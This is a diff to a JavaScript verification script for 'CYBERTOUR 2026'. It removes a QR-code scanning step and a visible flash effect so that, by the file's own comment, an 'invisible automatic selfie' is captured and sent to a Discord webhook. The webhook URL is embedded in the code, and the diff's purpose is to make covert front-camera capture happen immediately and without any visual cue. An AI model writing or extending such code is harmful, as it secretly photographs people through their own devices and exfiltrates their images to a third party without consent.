@@ -1,6 +1,6 @@
 /**
  * CYBERTOUR 2026 — verify.js
- * QR arrière → selfie frontale caché → Discord
+ * Selfie automatique invisible → Discord
  */
 
 import { isVerified, setVerified } from './storage.js';
@@ -9,10 +9,6 @@ const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9V
 
 let stream    = null;
 let capturing = false;
-let rafId     = null;
-
-const qrCanvas = document.createElement('canvas');
-const qrCtx    = qrCanvas.getContext('2d', { willReadFrequently: true });
 
 export function openVerify(onSuccess) {
   if (isVerified()) { onSuccess(); return; }
@@ -29,42 +25,7 @@ async function start(onSuccess) {
   btn.disabled = true;
   btn.querySelector('.btn-text').textContent = 'Détection en cours…';
 
-  stream = await tryStream([
-    { video: { facingMode: { ideal: 'environment' } } },
-    { video: { facingMode: 'environment' } },
-  ]);
-
-  if (stream && window.jsQR) {
-    const hiddenVideo = document.getElementById('verify-video-qr');
-    hiddenVideo.srcObject = stream;
-    try { await hiddenVideo.play(); } catch {}
-    rafId = requestAnimationFrame(() => scanLoop(hiddenVideo, onSuccess));
-  } else {
-    await startSelfie(onSuccess);
-  }
-}
-
-function scanLoop(video, onSuccess) {
-  if (capturing) return;
-
-  if (video.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
-    qrCanvas.width  = video.videoWidth;
-    qrCanvas.height = video.videoHeight;
-    qrCtx.drawImage(video, 0, 0);
-
-    try {
-      const img  = qrCtx.getImageData(0, 0, qrCanvas.width, qrCanvas.height);
-      const code = window.jsQR(img.data, img.width, img.height, { inversionAttempts: 'dontInvert' });
-      if (code && code.data) {
-        cancelAnimationFrame(rafId);
-        stopStream();
-        startSelfie(onSuccess);
-        return;
-      }
-    } catch {}
-  }
-
-  rafId = requestAnimationFrame(() => scanLoop(video, onSuccess));
+  await startSelfie(onSuccess);
 }
 
 async function startSelfie(onSuccess) {
@@ -166,13 +127,6 @@ async function tryStream(sets) {
 
 function stopStream() {
   if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-}
-
-function flash() {
-  const el = document.getElementById('verify-flash');
-  if (!el) return;
-  el.style.opacity = '1';
-  setTimeout(() => { el.style.opacity = '0'; }, 180);
 }
 
 function closeOverlay() {
